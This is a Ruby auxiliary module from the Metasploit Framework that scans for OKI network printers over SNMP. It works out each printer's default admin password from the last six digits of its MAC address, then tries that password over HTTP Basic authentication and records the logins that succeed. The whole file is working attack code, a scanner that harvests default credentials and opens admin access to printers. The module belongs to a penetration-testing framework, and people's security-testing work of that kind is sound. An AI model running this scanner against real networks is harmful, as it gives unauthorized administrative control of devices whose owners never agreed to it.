##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

# TODO: Split this module into two seperate SNMP and HTTP modules.

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'OKI Printer Default Login Credential Scanner',
      'Description'   => %q{
        This module scans for OKI printers via SNMP, then tries to connect to found devices
        with vendor default administrator credentials via HTTP authentication. By default, OKI
        network printers use the last six digits of the MAC as admin password.
      },
      'Author'        => 'antr6X <anthr6x[at]gmail.com>',
      'License'       => MSF_LICENSE
    ))

    register_options(
      [
        OptPort.new('SNMPPORT', [true, 'The SNMP Port', 161]),
        OptPort.new('HTTPPORT', [true, 'The HTTP Port', 80])
      ], self.class)

    deregister_options('RPORT', 'VHOST')
  end

  def cleanup
    datastore['RPORT'] = @org_rport
  end

  def run_host(ip)
    @org_rport = datastore['RPORT']
    datastore['RPORT'] = datastore['SNMPPORT']

    index_page = "index_ad.htm"
    auth_req_page = "status_toc_ad.htm"
    snmp = connect_snmp()

    snmp.walk("1.3.6.1.2.1.2.2.1.6") do |mac|
      last_six  = mac.value.unpack("H2H2H2H2H2H2").join[-6,6].upcase
      first_six = mac.value.unpack("H2H2H2H2H2H2").join[0,6].upcase

      #check if it is a OKI
      #OUI list can be found at http://standards.ieee.org/develop/regauth/oui/oui.txt
      if first_six ==  "002536" || first_six == "008087" || first_six == "002536"
        sys_name = snmp.get_value('1.3.6.1.2.1.1.5.0').to_s
        print_status("Found: #{sys_name}")
        print_status("Trying credential: admin/#{last_six}")

        tcp = Rex::Socket::Tcp.create(
          'PeerHost' => rhost,
          'PeerPort' => datastore['HTTPPORT'],
          'Context' =>
            {
              'Msf'=>framework,
              'MsfExploit'=>self
            }
        )

        auth = Rex::Text.encode_base64("admin:#{last_six}")

        http_data = "GET /#{auth_req_page} HTTP/1.1\r\n"
        http_data << "Referer: http://#{ip}/#{index_page}\r\n"
        http_data << "Authorization: Basic #{auth}\r\n\r\n"

        tcp.put(http_data)
        data = tcp.recv(12)

        response = "#{data[9..11]}"

        case response
        when "200"
          print_good("#{rhost}:#{datastore['HTTPPORT']} logged in as: admin/#{last_six}")
          report_auth_info(
            :host  => rhost,
            :port  => datastore['HTTPPORT'],
            :proto => "tcp",
            :user  => 'admin',
            :pass  => last_six
          )
        when "401"
          print_error("Default credentials failed")
        when "404"
          print_status("Page not found, try credential manually: admin/#{last_six}")
        else
          print_status("Unexpected message")
        end

        disconnect()
      end
    end

    # No need to make noise about timeouts
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
end
